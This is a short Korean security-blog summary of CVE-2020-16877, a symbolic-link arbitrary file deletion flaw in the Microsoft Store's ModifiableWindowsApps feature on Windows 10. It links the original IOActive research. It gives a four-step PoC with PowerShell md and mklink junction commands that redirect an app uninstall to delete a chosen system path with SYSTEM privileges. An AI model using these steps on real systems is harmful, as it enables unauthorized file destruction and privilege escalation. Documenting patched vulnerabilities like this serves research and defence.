---
title: "[하루한줄] CVE-2020-16877: Exploiting Microsoft Store Games"
author: L0ch
tags: [L0ch, cve, arbitrary file deletion, microsoft store, eop, symbolic link]
categories: [1day1line]
date: 2020-11-03 18:00:00
cc: true
index_img: /img/1day1line.png
---

## URL
[CVE-2020-16877: Exploiting Microsoft Store Games](https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html)



## Target
Windows 10 - Microsoft Store



## Explain
Microsoft Store에서 배포하는 UWP(Universal Windows platform) 앱은 일반적으로  `C:\Program Files\WindowsApps` 디렉토리에 저장되어 일반적인 권한으로 접근할 수 없으며 Appx라는 형식의 파일을 앱 설치 관리자 프로그램을 통해서만 설치/제거가 가능합니다. 

지난 6월 Microsoft는 게임 앱의 모드를 지원하기 위해 수정이 가능한 Windows 앱을 호스팅하는 디렉토리인 `C:\ProgramFiles\ModifiableWindowsApps` 을 추가했는데, 이 기능에 심볼릭링크를 사용해 arbitrary file deletion 취약점이 발견되었습니다.



PoC는 아래와 같습니다.

1. 다른 시스템 드라이브`D:\`에 pivot할 경로를 생성하고 windows 저장소 설정을 통해 기본 저장위치를 `D:\` 로 변경합니다

```powershell
md "D :\Program Files"
md "D :\pivot"
```

2. Microsoft Store에서 모드 지원이 되는 게임앱을 받아 설치하면 `D:\Program Files\ModifiableWindowsApps` 하위에 해당 앱의 디렉토리가 생성됩니다.

3. 이중 심볼릭 링크를 생성해 앱의 디렉토리가 심볼릭 링크의 교차점이 되도록 만들고, 심볼릭 링크로 리디렉션할 최종 디렉토리는 삭제할 시스템 권한의 디렉토리로 설정합니다.

```powershell
mklink / J "D:\Program Files\ModifiableWindowsApps" "D:\pivot"
mklink / J "D:\pivot\Game_App" "C:\arbitrary_path\to_delete"
```

4. 앱을 삭제하면 이중 심볼릭 링크로 인해 시스템 권한으로 임의 경로의 파일이 삭제됩니다.

작성자는 시스템 권한의 쉘을 실행하는 데모 영상 또한 공개했습니다.

